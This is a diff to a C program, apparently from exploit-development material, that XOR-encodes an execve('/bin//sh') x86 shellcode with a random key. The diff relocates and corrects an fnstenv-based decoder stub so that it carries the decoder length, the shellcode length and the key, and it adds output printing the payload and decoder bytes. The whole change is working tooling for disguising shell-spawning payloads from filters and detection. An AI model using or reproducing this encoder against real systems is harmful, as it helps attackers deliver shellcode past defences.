@@ -27,10 +27,9 @@ void print_code(char *data) {
     int i, l = 15;
     for (i=0; i < strlen(data); ++i) {
         if (l >= 15) {
-            if (i)
-                printf ("\"\n");
-                printf("\t\"");
-                l = 0;
+            if (i) printf ("\"\n");
+            printf("\t\"");
+            l = 0;
         }
         ++l;
         printf("\\x%02x", ((unsigned char *)data)[i]);
@@ -45,6 +44,12 @@ int main() {
         "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
         "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
         "\xd2\xb0\x0b\xcd\x80";
+    
+    // simple fnstenv xor decoder, nulls are overwritten with length and key.
+    // decoder is 20 bytes long.  Byte position for length is position 9 (starting at 0 for first byte).
+    char decoder [] =
+        "\xd9\xe1\xd9\x74\x24\xf4\x5a\x80\xc2\x00\x31"
+        "\xc9\xb1\x00\x80\x32\x00\x42\xe2\xfa";
 
     int count;
     int number = getnumber(200);        // random number generator
@@ -53,18 +58,22 @@ int main() {
     int lshellcode = strlen(shellcode); // store length of shellcode
     char * result;
 
-    // simple fnstenv xor decoder, nulls are overwritten with length and key.
-    char decoder [] =
-        "\xd9\xe1\xd9\x74\x24\xf4\x5a\x80\xc2\x00\x31"
-        "\xc9\xb1\x18\x80\x32\x00\x42\xe2\xfa";
-
-    printf("Using the key: %d to xor encode the shellcode\n", number);
-    decoder[9] += 0x14;                 // length of the decoder
+    decoder[9] += 20;                   // length of the decoder
+    decoder[13] += lshellcode;          // length of the shellcode
     decoder[16] += number;              // key to encode with
-    ldecoder = strlen(decoder);         // calculate length of decoder
-
+    ldecoder = decoder[9];
+    
+    printf("Using the key: %d to xor encode the shellcode\n", number);
+    
     printf("\nchar original_shellcode[] =\n");
     print_code(shellcode);
+    
+    printf("\nchar decoder[] =\n");
+    print_code(decoder);
+    
+    printf("The length of the decoder is %d decimal or %x hex.\n", ldecoder, ldecoder);
+    printf("The length of the shellcode is %d decimal or %x hex.\n", lshellcode, lshellcode);
+    printf("The shellcode will be encoded with the key: %d in decimal or %x in hex.\n", number, number);
 
     do {                                // encode the shellcode
         if (badchar == 1) {             // if bad char, regenerate key
